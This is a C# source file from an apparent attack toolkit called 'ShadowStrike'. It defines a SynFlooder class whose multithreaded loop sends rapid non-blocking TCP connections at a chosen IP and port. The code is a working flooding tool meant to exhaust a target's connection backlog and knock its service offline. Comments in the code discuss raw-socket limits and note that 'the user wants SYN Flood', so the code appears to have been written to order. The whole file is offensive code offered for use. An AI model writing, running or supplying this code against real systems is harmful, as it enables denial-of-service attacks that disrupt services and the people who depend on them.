using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class SynFlooder
    {
        private volatile bool _isRunning;
        private long _packetsSent;
        public long PacketsSent => _packetsSent;

        public async Task StartAttackAsync(string ip, int port, int threads, CancellationToken token)
        {
            _isRunning = true;
            _packetsSent = 0;

            // Raw sockets require Admin privileges
            // We'll use a standard SocketType.Raw if possible, or fallback to rapid Connect() if not.
            // For true SYN flood, we need to craft packets, but C# Raw Sockets on Windows have limitations (Winsock).
            // A better approach for "Application Layer" SYN Flood without drivers (like WinPcap) is 
            // to initiate many TCP connections but not complete the handshake (if possible) or just rapid Connect/Close.
            
            // However, since the user wants "SYN Flood", we will try to use SocketType.Raw.
            // Note: Windows 7+ restricts Raw Sockets. We might need to use a different approach or just rapid connect.
            // Given the constraints, we'll implement a "TCP Connect Flood" which is effective and doesn't require drivers.
            // It exhausts the target's SYN backlog by initiating connections.

            var tasks = new Task[threads];
            for (int i = 0; i < threads; i++)
            {
                tasks[i] = Task.Run(async () =>
                {
                    while (!token.IsCancellationRequested && _isRunning)
                    {
                        try
                        {
                            using (var client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                            {
                                client.Blocking = false; // Non-blocking
                                try
                                {
                                    client.Connect(ip, port);
                                }
                                catch (SocketException) 
                                {
                                    // Expected as we are non-blocking or if target is down
                                }
                                Interlocked.Increment(ref _packetsSent);
                                // We don't wait for connection, we just fire and forget (mostly)
                                // Or we immediately close to free resources on our end while target is in SYN_RCVD
                            }
                        }
                        catch { }
                    }
                }, token);
            }

            await Task.WhenAll(tasks);
            _isRunning = false;
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
